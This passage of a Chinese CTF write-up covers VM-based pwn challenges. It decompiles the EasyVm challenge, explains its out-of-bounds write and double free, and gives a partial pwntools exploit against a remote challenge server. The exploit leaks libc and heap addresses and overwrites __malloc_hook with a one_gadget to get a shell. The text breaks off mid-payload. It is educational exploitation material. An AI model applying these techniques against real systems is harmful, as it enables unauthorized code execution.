@@ -1,0 +1,444 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="960378132ce38d44dbfdb49b1f1b35b7">VMPwn之温故知新</h1>
+<h2 data-content="1" id="bdfb0d2067048f0a8d9f6a6a8a577b87">前言</h2>
+<p>VMPwn泛指实现一些运算指令来模拟程序运行的Pwn题。去年十二月的时候跟着<code>0xC4m3l</code>师傅的文章系统学习了一下VMPwn，到今天发现VMPwn已经成了一个主流的出题方向，在去年的上海大学生网络安全大赛和红帽杯的线下也有几道VMPwn，因此我这里拿几道最近的题目来总结一下此类问题的一般思路。</p>
+<h2 data-content="1" id="748689522118d7ce8090b8867017044d">题目概述</h2>
+<p>我们现在常见到的VMPwn基本设计如下：</p>
+<ol>
+<li>分配内存模拟程序执行，基本组成要素为代码区和数据区，这两块区域可以分配在同一块内存或者两块独立内存。</li>
+<li>数据区域包含模拟栈和模拟寄存器。</li>
+<li>代码区根据用户指令模拟各种操作，如压栈出栈，寄存器立即数运算等</li>
+<li>一般都是数据区的读写越界引发的漏洞，根据数据区内存分配位置的不同可以分为栈越界，bss越界和堆越界三类问题。</li>
+</ol>
+<p>典型的题目有ciscn_2019_virtual、Ogeek_ovm、D3CTF_babyrop等。除了这种在机器码层面模拟程序执行的题目，还有模拟运行高级语言代码的题目，二者侧重点不太一样，我们分别拿例题来讲解。</p>
+<h2 data-content="1" id="bc95ed51b77cb6795a9946113585ac8d">汇编类VMPwn</h2>
+<p>这类问题的核心就是逆向，漏洞多是越界读写，先分析VM接收的数据格式，之后通过静态代码分析和动态调试搞清每条模拟指令的含义，再根据指令进行组合利用漏洞。</p>
+<h3 data-content="1" id="d40ab7c37e7a41cb5a66d52d13909c48">2020-no-Conv-CTF_EasyVm</h3>
+<h4 data-content="1" id="18660ee9bfb3cdcd4d3fb8d88449eba4">程序逻辑</h4>
+<p>在逆指令前，可以通过IDA的结构体导入功能导入C语言形式的结构体，简化代码。经过分析，核心的数据结构是这样一个node结构体。</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">node</span><span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">reg</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">chunk1</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">chunk2</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">memchunk</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">res2</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">chunk_addr</span><span class="p">;</span>
+<span class="p">};</span>
+</pre></div>
+<p>首先是main函数的代码，大的功能是分配一块区域供用户写指令和数据，将这块内存作为参数交与VM虚拟机执行，释放堆内存以及给一个present。</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// ST2C_4</span>
+  <span class="n">node</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-18h]</span>
+  <span class="kt">int</span> <span class="n">bss_addr</span><span class="p">;</span> <span class="c1">// [esp+ACh] [ebp+7Ch]</span>
+
+  <span class="n">Init</span><span class="p">();</span>
+  <span class="n">ptr</span> <span class="o">=</span> <span class="n">SetInit</span><span class="p">();</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">menu</span><span class="p">()</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300u</span><span class="p">);</span>                   <span class="c1">// produce</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x2FFu</span><span class="p">);</span>
+        <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>                                   <span class="c1">// start</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">MainMethod</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span> <span class="p">)</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">chunk_addr</span><span class="p">);</span>          <span class="c1">// Recycle,double free</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Maybe a bug is a gif?"</span><span class="p">);</span>
+        <span class="n">some_bss_val</span> <span class="o">=</span> <span class="n">bss_addr</span><span class="p">;</span>                <span class="c1">// 这里需要调试看到这个值</span>
+        <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_3020</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Zzzzzz........"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Are you kidding me ?"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>MainMethod函数实现的指令比较多，我们截取漏洞利用用到的，其他的指令还有<code>add,sub,sub,mul,div,xor,&gt;&gt;,&lt;&lt;,return,or,and</code>。</p>
+<p>0x80这条指令同Magic函数相关，在IDA中其反编译的效果并不好，在gdb动态调试之后我们可以发现这条指令的含义是<code>ptr_chunk[idx]=val</code>，其中idx和val都是可控数据，因此这里存在堆越界写。</p>
+<p>0x53指令调用putchar输出<code>*reg[3]</code>的值。</p>
+<p>0x76指令设置<code>reg[3]=*(ptr_chunk-&gt;chunk1)</code>。</p>
+<p>0x54指令调用getchar函数向<code>ptr_chunk-&gt;reg[3]</code>存储的地址里输入值。</p>
+<p>0x9指令将我们main函数中获取的present赋值给<code>ptr_chunk-&gt;reg[1]</code>，配合指令0x11可以将这个值输出。</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">MainMethod</span><span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="n">ptr_chunk</span><span class="p">)</span>
+<span class="p">{</span>   <span class="c1">//...</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mh">0x80u</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="n">Magic</span><span class="p">(</span><span class="n">ptr_chunk</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span><span class="c1">// magic here,prt_chunk[可控idx] = 可控数字</span>
+      <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">+=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mh">0x53</span> <span class="p">)</span><span class="c1">// leak</span>
+        <span class="p">{</span>
+        <span class="n">putchar</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>      <span class="c1">// 改为got表</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mh">0x76</span> <span class="p">)</span>
+        <span class="p">{</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">chunk1</span><span class="p">;</span><span class="c1">// set val</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">chunk1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">chunk1</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mh">0x54</span> <span class="p">)</span><span class="c1">// get input；get shell</span>
+        <span class="p">{</span>
+        <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+        <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mi">9</span> <span class="p">)</span>
+        <span class="p">{</span>
+        <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">some_bss_val</span><span class="p">;</span>         <span class="c1">// set bss addr</span>
+        <span class="o">++</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span> <span class="o">==</span> <span class="mh">0x11</span> <span class="p">)</span><span class="c1">// leak proc base</span>
+        <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="o">++</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">mem_chunk</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="c1">//...</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">Magic</span><span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="n">ptr_chunk</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">one</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">one</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_chunk</span><span class="o">-&gt;</span><span class="n">reg</span> <span class="o">+</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">free_ptr</span> <span class="o">-</span> <span class="mh">0xBE7</span><span class="p">))</span> <span class="o">+</span> <span class="n">one</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
+    <span class="n">chk_fail</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<h4 data-content="1" id="934732646ddd81c3327b84583e2d0106">漏洞利用</h4>
+<p>这里的漏洞就是0x80指令的越界问题，以及main函数中清空堆块时的double free，还有出题人留的一个present。</p>
+<p>我们首先用gdb调试查看所谓的present，发现是一个bss地址，因此使用<code>0x9+0x11</code>可以泄露程序加载基址<code>proc_base</code>。</p>
+<p>有了基址我们使用<code>0x80</code>指令将<code>reg[3]</code>改为<code>puts@got</code>，配合<code>0x53</code>的单字节打印分4次输出得到puts函数地址从而得到libc基址。</p>
+<p>泄露heap地址也同理，我们用<code>0x80</code>指令将<code>reg[3]</code>改成<code>main_arena-&gt;bins[]</code>中的<code>smallbin</code>的存储地址，再调用<code>0x53</code>指令输出得到heap基址。</p>
+<p>最后Getshell需要<code>0x80+0x76+0x54</code>，我们在堆上写一个<code>__malloc_hook</code>地址，通过0x80指令将<code>ptr_chunk-&gt;chunk1</code>改成存储<code>__malloc_hook</code>的堆地址，<code>0x76指令</code>则将这个地址赋值给<code>reg[3]</code>，而<code>0x54</code>指令可以单字节向<code>__malloc_hook</code>输入值，我们分4次写入<code>one_gadget</code>即可。</p>
+<div class="highlight"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">rud</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">'i386'</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span><span class="s1">'split'</span><span class="p">,</span><span class="s1">'-h'</span><span class="p">]</span>
+<span class="n">debug</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./EasyVM'</span><span class="p">)</span>
+<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+<span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x3ac5c</span><span class="p">,</span><span class="mh">0x3ac5e</span><span class="p">,</span><span class="mh">0x3ac62</span><span class="p">,</span><span class="mh">0x3ac69</span><span class="p">,</span><span class="mh">0x5fbc5</span><span class="p">,</span><span class="mh">0x5fbc6</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/i386-linux-gnu/libc.so.6'</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./EasyVM'</span><span class="p">)</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.23.so'</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'121.36.215.224'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Add</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'1'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.02</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Start</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Delete</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'3'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">Gift</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'4'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="c1">#leak proc base</span>
+    <span class="n">Gift</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x9</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x11</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x99</span><span class="p">)</span>
+    <span class="n">Add</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">Start</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"0x"</span><span class="p">)</span>
+    <span class="n">code_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x565556c0</span><span class="o">-</span><span class="mh">0x56555000</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"code base =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">code_base</span><span class="p">))</span>
+    <span class="c1">#leak libc</span>
+    <span class="n">Delete</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">code_base</span><span class="o">+</span><span class="mh">0x0002fd0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">code_base</span><span class="o">+</span><span class="mh">0x0002fd1</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">code_base</span><span class="o">+</span><span class="mh">0x0002fd2</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">code_base</span><span class="o">+</span><span class="mh">0x0002fd3</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x99</span><span class="s1">'</span>
+    <span class="n">Add</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">Start</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"libc base =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="c1">#leak heap</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0xf7fb2150</span><span class="o">-</span><span class="mh">0xf7e00000</span><span class="p">)</span>
+    <span class="n">malloc</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadgets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
